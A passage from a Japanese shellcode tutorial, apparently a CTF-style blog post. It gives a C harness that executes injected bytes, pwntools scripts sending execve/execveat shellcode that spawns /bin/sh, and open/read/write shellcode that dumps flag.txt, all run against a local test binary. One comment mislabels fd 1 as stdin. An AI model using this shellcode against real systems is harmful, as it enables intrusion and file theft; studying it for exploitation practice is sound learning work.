keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>exec_mem<span class=\"token punctuation\">,</span> input<span class=\"token punctuation\">,</span> <span class=\"token number\">4096</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"jmp *%0\"</span> <span class=\"token operator\">::</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">(</span>exec_mem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">munmap</span><span class=\"token punctuation\">(</span>exec_mem<span class=\"token punctuation\">,</span> <span class=\"token number\">4096</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>このコードをコンパイルしたバイナリに対して Shell Code を送り込むと、その Shell Code をメモリ内に埋め込んで実行してくれます。</p>\n<p>テストには以下の Python スクリプトを使用できます。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token comment\"># Set context</span>\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">\"debug\"</span>\ncontext<span class=\"token punctuation\">.</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">\"amd64\"</span>\ncontext<span class=\"token punctuation\">.</span>endian <span class=\"token operator\">=</span> <span class=\"token string\">\"little\"</span>\ncontext<span class=\"token punctuation\">.</span>word_size <span class=\"token operator\">=</span> <span class=\"token number\">64</span>\n\n<span class=\"token comment\"># Set gdb script</span>\ngdbscript <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"\"\"\nb *(main+389)\ncontinue\n\"\"\"</span></span>\n\n<span class=\"token comment\"># Set target</span>\nTARGET_PATH <span class=\"token operator\">=</span> <span class=\"token string\">\"./a.out\"</span>\nexe <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>TARGET_PATH<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># Run program</span>\nis_gdb <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span>\nis_gdb <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>\n<span class=\"token keyword\">if</span> is_gdb<span class=\"token punctuation\">:</span>\n    target <span class=\"token operator\">=</span> gdb<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span>TARGET_PATH<span class=\"token punctuation\">,</span> aslr<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>gdbscript<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># target = remote(\"address\", port)</span>\n    target <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>TARGET_PATH<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># Exploit</span>\nr <span class=\"token operator\">=</span> target<span class=\"token punctuation\">.</span>recvline_startswith<span class=\"token punctuation\">(</span><span class=\"token string\">b\"System:\"</span><span class=\"token punctuation\">)</span>\nsystem_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\nr <span class=\"token operator\">=</span> target<span class=\"token punctuation\">.</span>recvline_startswith<span class=\"token punctuation\">(</span><span class=\"token string\">b\"binsh:\"</span><span class=\"token punctuation\">)</span>\nbinsh_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\nr <span class=\"token operator\">=</span> target<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>\n<span class=\"token string-interpolation\"><span class=\"token string\">f\"\"\"mov rdi, </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>binsh_addr<span class=\"token punctuation\">}</span></span><span class=\"token string\">\nmov rsi, 0\nmov rdx, 0\nmov rax, 59\nsyscall\n\"\"\"</span></span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span> shellcode\ntarget<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./payload\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"wb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># Finish exploit</span>\ntarget<span class=\"token punctuation\">.</span>clean<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ntarget<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>このコードでは、この項で作成した execve を使用して Shell を取得する Shell Code を送信しています。</p>\n<p>実際に実行してみると、以下のような命令片が実行され、Shell を起動できることを確認できます。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 779px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/26955300ad2a150642dde554ce1ac88c/96e92/image-20240626202459269.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 61.24999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAAB60lEQVQoz42TW4+bMBCFedh2E4wBgy+ADUkgaW5NArltFDX//2edDkmkrqrubh8+GXk8R55zjJeMLEIloU0JaehbK1hZQMsMoZFEhTBvaC0gtEalLBzVY6MR9dBenBuqFYiiGF5YZZClQ92sMWrm4JlCIXKoNENQKERFjtDW4HlOAgol1SzBVAqmCUmYFDzV8P0AXqIlut0eXdfhfDojM3SYcyht6JYGzjo4V6IqK4g4wavvY8gYGDUHT9iTICDBrCrQtS1aErxer7DWgscB1DxFMhbIVxmSRkDUMcKCP0SCf8NYf8NM4rDf43DY43b7haIoINMUTVPDugJvbydommIweKUmhoD1+M/1PY89LzIG0+kCzWyB9c+WmmlkMleMyD/ySGuHKLFggSDij+F9nW64Pe1Rjrd4CdcYJN0dk48w+7FELBSGfgSf62dD/AUkeLmdMZ0f8S1uKbULhvJMIVTYbjdYLhcwpk9v8MW4f/CO1yMm0w7fSdBXveAerhyhbXe4XC73kIZD/2H8ByLsXc07XA4YNzu8RBsSO2CY7lC5GtvNFnXdQEpF6bFHip/CHyO7+QqmXCKNHEIxB0tniEv6c+jtWRLmEQny9D+QD8GqnGOiVvT6HZiYIZITaMuRyARCiLt37BPP/uY3u3UqY4I25vcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/26955300ad2a150642dde554ce1ac88c/8ac56/image-20240626202459269.webp 240w,\n/static/26955300ad2a150642dde554ce1ac88c/d3be9/image-20240626202459269.webp 480w,\n/static/26955300ad2a150642dde554ce1ac88c/82ce4/image-20240626202459269.webp 779w\"\n              sizes=\"(max-width: 779px) 100vw, 779px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/26955300ad2a150642dde554ce1ac88c/8ff5a/image-20240626202459269.png 240w,\n/static/26955300ad2a150642dde554ce1ac88c/e85cb/image-20240626202459269.png 480w,\n/static/26955300ad2a150642dde554ce1ac88c/96e92/image-20240626202459269.png 779w\"\n            sizes=\"(max-width: 779px) 100vw, 779px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/26955300ad2a150642dde554ce1ac88c/96e92/image-20240626202459269.png\"\n            alt=\"image-20240626202459269\"\n            title=\"image-20240626202459269\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<h3 id=\"execveat-でプログラムを実行する\" style=\"position:relative;\"><a href=\"#execveat-%E3%81%A7%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B\" aria-label=\"execveat でプログラムを実行する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>execveat でプログラムを実行する</h3>\n<p>まずは execveat でプログラムを実行する Shell Code を作成してみます。</p>\n<p>execveat は第 2 引数に実行ファイルのパスをとります。</p>\n<p>このパスが絶対パスの場合、第 1 引数の dirfd は無視されるので適当に設定できます。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/fcntl.h></span>      <span class=\"token comment\">/* Definition of AT_* constants */</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">execveat</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> dirfd<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>pathname<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token keyword\">const</span> _Nullable argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token keyword\">const</span> _Nullable envp<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">int</span> flags<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>参考：<a href=\"https://man7.org/linux/man-pages/man2/execveat.2.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">execveat(2) - Linux manual page</a></p>\n<p>以下の Shell Code を作成しました。</p>\n<div class=\"gatsby-highlight\" data-language=\"nasm\"><pre class=\"language-nasm\"><code class=\"language-nasm\">mov <span class=\"token register variable\">rax</span>, <span class=\"token number\">322</span>\nmov <span class=\"token register variable\">rdi</span>, <span class=\"token number\">0</span>\nmov <span class=\"token register variable\">rsi</span>, {binsh_addr}\nmov <span class=\"token register variable\">rdx</span>, <span class=\"token number\">0</span>\nmov <span class=\"token register variable\">r10</span>, <span class=\"token number\">0</span>\nxor <span class=\"token register variable\">r8</span>, <span class=\"token register variable\">r8</span>\nsyscall</code></pre></div>\n<p>これを以下のように Shell Code 化したものをテストプログラムに送り込むと、Shell を取得できました。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>\n<span class=\"token string-interpolation\"><span class=\"token string\">f\"\"\"mov rax, 322\nmov rdi, 0\nmov rsi, </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>binsh_addr<span class=\"token punctuation\">}</span></span><span class=\"token string\">\nmov rdx, 0\nmov r10, 0\nxor r8, r8\nsyscall\n\"\"\"</span></span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 745px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/19ce69109759c1f9086e25b4115be66b/7e509/image-20240626204219748.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/UlEQVQoz6WR23KCMBRFU0AQJF4Y0RpoyAUUHf7/95aBTvtiX9o+7Nn7THLWnJOIY7tH+Qo/KVpfo43B3yZMP9L5ATOMKG3R7hrqG03neG80tu+x1qA7zTD0GNOx2+8Q0VuM6Qzq0rBerwOo5cOdaPSJ6nBgtUpIknhRGnKWrj7z4glxHH+7EGKWwHnLITTPuVCC/CJIK/F14XdK8xTfO6qqQu4LzlbS3LfUWobpUuRWUpYlUkq2Ic9bFEUR6nLxF6DRLY/pwXgfadsmrK7C2zi01pzPJ6wzS+MMLQMkyzLyPGdTbhZ/AfZKYZz9+fAvuoafOtbHZaUoiv4NfAJ69Z77a3O4IwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/19ce69109759c1f9086e25b4115be66b/8ac56/image-20240626204219748.webp 240w,\n/static/19ce69109759c1f9086e25b4115be66b/d3be9/image-20240626204219748.webp 480w,\n/static/19ce69109759c1f9086e25b4115be66b/06157/image-20240626204219748.webp 745w\"\n              sizes=\"(max-width: 745px) 100vw, 745px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/19ce69109759c1f9086e25b4115be66b/8ff5a/image-20240626204219748.png 240w,\n/static/19ce69109759c1f9086e25b4115be66b/e85cb/image-20240626204219748.png 480w,\n/static/19ce69109759c1f9086e25b4115be66b/7e509/image-20240626204219748.png 745w\"\n            sizes=\"(max-width: 745px) 100vw, 745px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/19ce69109759c1f9086e25b4115be66b/7e509/image-20240626204219748.png\"\n            alt=\"image-20240626204219748\"\n            title=\"image-20240626204219748\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<h3 id=\"openreadwrite-でファイルの中身を出力する\" style=\"position:relative;\"><a href=\"#openreadwrite-%E3%81%A7%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E4%B8%AD%E8%BA%AB%E3%82%92%E5%87%BA%E5%8A%9B%E3%81%99%E3%82%8B\" aria-label=\"openreadwrite でファイルの中身を出力する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>open、read、write でファイルの中身を出力する</h3>\n<p>次は、プログラムの実行ではなくシステム内のファイルのデータを読み出して標準出力に返す Shell Code を実装していきます。</p>\n<p>ファイルのデータにアクセスするためにはまず、open を使用してファイルのファイルディスクリプタを開きます。</p>\n<p>open では、第 1 引数にファイルパスを渡します。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>pathname<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> flags<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token comment\">/* mode_t mode */</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>参考：<a href=\"https://man7.org/linux/man-pages/man2/open.2.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">open(2) - Linux manual page</a></p>\n<p>例えば、以下はハードコードされたファイル名をスタックに格納し、open でファイルディスクリプタを取得するシェルコードです。</p>\n<div class=\"gatsby-highlight\" data-language=\"nasm\"><pre class=\"language-nasm\"><code class=\"language-nasm\">mov <span class=\"token register variable\">rax</span>, <span class=\"token number\">0x7478742e67616c66</span> <span class=\"token comment\">; flag.txt</span>\npush <span class=\"token number\">0x0</span>\npush <span class=\"token register variable\">rax</span>\nmov <span class=\"token register variable\">rax</span>, <span class=\"token number\">2</span> <span class=\"token comment\">; open</span>\nmov <span class=\"token register variable\">rdi</span>, <span class=\"token register variable\">rsp</span>\nmov <span class=\"token register variable\">rsi</span>, <span class=\"token number\">0</span>\nmov <span class=\"token register variable\">rdx</span>, <span class=\"token number\">0</span>\nsyscall</code></pre></div>\n<p>ファイルパスについては、他の方法で取得したり、事前にスタックに突っ込んでおいてもいいかもしれません。</p>\n<p>末尾に NULL バイトを挿入することを忘れないようにします。</p>\n<p>このシステムコールで取得したファイルディスクリプタは RAX に保持されます。</p>\n<p>続いて、read を使用してファイルの情報をバッファに格納します。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token class-name\">ssize_t</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> fd<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> buf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> count<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>ファイルデータを読み取るため、以下のアセンブリコードを作成しました。</p>\n<p>このコードでは、ファイルディスクリプタから 20 バイトをスタックに read します。</p>\n<div class=\"gatsby-highlight\" data-language=\"nasm\"><pre class=\"language-nasm\"><code class=\"language-nasm\">mov <span class=\"token register variable\">rdi</span>, <span class=\"token register variable\">rax</span> <span class=\"token comment\">; fd を第 1 引数に</span>\nmov <span class=\"token register variable\">rax</span>, <span class=\"token number\">0</span> <span class=\"token comment\">; read</span>\nmov <span class=\"token register variable\">rsi</span>, <span class=\"token register variable\">rsp</span> <span class=\"token comment\">; とりあえずスタックをバッファに指定</span>\nmov <span class=\"token register variable\">rdx</span>, <span class=\"token number\">20</span>\nsyscall</code></pre></div>\n<p>参考：<a href=\"https://man7.org/linux/man-pages/man2/read.2.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">read(2) - Linux manual page</a></p>\n<p>最後に、write を使用して read した文字列を標準出力に返します。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token class-name\">ssize_t</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> fd<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> buf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> count<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>以下のアセンブリコードを使用します。</p>\n<div class=\"gatsby-highlight\" data-language=\"nasm\"><pre class=\"language-nasm\"><code class=\"language-nasm\">mov <span class=\"token register variable\">rax</span>, <span class=\"token number\">1</span> <span class=\"token comment\">; write</span>\nmov <span class=\"token register variable\">rdi</span>, <span class=\"token number\">1</span> <span class=\"token comment\">; stdin</span>\nmov <span class=\"token register variable\">rsi</span>, <span class=\"token register variable\">rsp</span>\nmov <span class=\"token register variable\">rdx</span>, <span class=\"token number\">20</span>\nsyscall</code></pre></div>\n<p>参考：<a href=\"https://man7.org/linux/man-pages/man2/write.2.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">write(2) - Linux manual page</a></p>\n<p>これを実際にテストプログラムに送り込むスクリプトは以下の通りです。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token comment\"># Set context</span>\ncontext<span class=\"token punctuation\">.</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">\"amd64\"</span>\ncontext<span class=\"token punctuation\">.</span>endian <span class=\"token operator\">=</span> <span class=\"token string\">\"little\"</span>\ncontext<span class=\"token punctuation\">.</span>word_size <span class=\"token operator\">=</span> <span class=\"token number\">64</span>\n\n<span class=\"token comment\"># Set target</span>\nTARGET_PATH <span class=\"token operator\">=</span> <span class=\"token string\">\"./run_shellcode.bin\"</span>\nexe <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>TARGET_PATH<span class=\"token punctuation\">)</span>\ntarget <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>TARGET_PATH<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># Exploit</span>\nr <span class=\"token operator\">=</span> target<span class=\"token punctuation\">.</span>recvline_startswith<span class=\"token punctuation\">(</span><span class=\"token string\">b\"System:\"</span><span class=\"token punctuation\">)</span>\nsystem_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\nr <span class=\"token operator\">=</span> target<span class=\"token punctuation\">.</span>recvline_startswith<span class=\"token punctuation\">(</span><span class=\"token string\">b\"binsh:\"</span><span class=\"token punctuation\">)</span>\nbinsh_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\nstack_addr <span class=\"token operator\">=</span> binsh_addr\nfile_name <span class=\"token operator\">=</span> <span class=\"token string\">\"0x\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"flag.txt\"</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nr <span class=\"token operator\">=</span> target<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>\n<span class=\"token string-interpolation\"><span class=\"token string\">f\"\"\"mov rax, </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>file_name<span class=\"token punctuation\">}</span></span><span class=\"token string\">\npush 0x0\npush rax\nmov rax, 2\nmov rdi, rsp\nmov rsi, 0\nmov rdx, 0\nsyscall\n\nmov rdi, rax\nmov rax, 0\nmov rsi, rsp\nmov rdx, 20\nsyscall\n\nmov rax, 1\nmov rdi, 1\nmov rsi, rsp\nmov rdx, 20\nsyscall\n\"\"\"</span></span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span> shellcode\ntarget<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># Finish exploit</span>\ntarget<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ntarget<span class=\"token punctuation\">.</span>clean<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>このスクリプトを実行すると、作成した Shell Code によって flag.txt 内の文字列が出力されます。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 782px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/f0f4b283481f2633f91364a19619a9a4/2e195/image-20240626220452807.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.08333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+klEQVQY05WQ226DMBBEDZhAQOXiuiENEGMTEhLaqv//c6dOovah7UseRjsr7R6NRuhdhT3vcOcWO7XMl3fm5dPrAzNO7N1EZ6z3x9v+2hn6wXI4OMxgcM5i7UBRPCGEQAQiZLksqEqTZDHtQdG4HN0UyCi6Hz2iMAzYm94/S8K1YL0VZK0gSMXjsKuKqsCNlmbb+FQ+XacY5h1Kl5RliXpWt1lWJXmek6QJdV1Rq/p/4Hk+cTxNjNdOjGEcR5blja7vvXd+dh5Qo7VGv2gPL25+s9mQZdlf4L5pSNcpQRAQyYg4jomikDC8K/I9SimRsWS1Wv3s3/438AvKT4qpZCWVBAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f0f4b283481f2633f91364a19619a9a4/8ac56/image-20240626220452807.webp 240w,\n/static/f0f4b283481f2633f91364a19619a9a4/d3be9/image-20240626220452807.webp 480w,\n/static/f0f4b283481f2633f91364a19619a9a4/c0b7e/image-20240626220452807.webp 782w\"\n              sizes=\"(max-width: 782px) 100vw, 782px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f0f4b283481f2633f91364a19619a9a4/8ff5a/image-20240626220452807.png 240w,\n/static/f0f4b283481f2633f91364a19619a9a4/e85cb/image-20240626220452807.png 480w,\n/static/f0f4b283481f2633f91364a19619a9a4/2e195/image-20240626220452807.png 782w\"\n            sizes=\"(max-width: 782px) 100vw, 782px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f0f4b283481f2633f91364a19619a9a4/2e195/image-20240626220452807.png\"\n            alt=\"image-20240626220452807\"\n            title=\"image-20240626220452807\"\n            loading=\"lazy\"\n            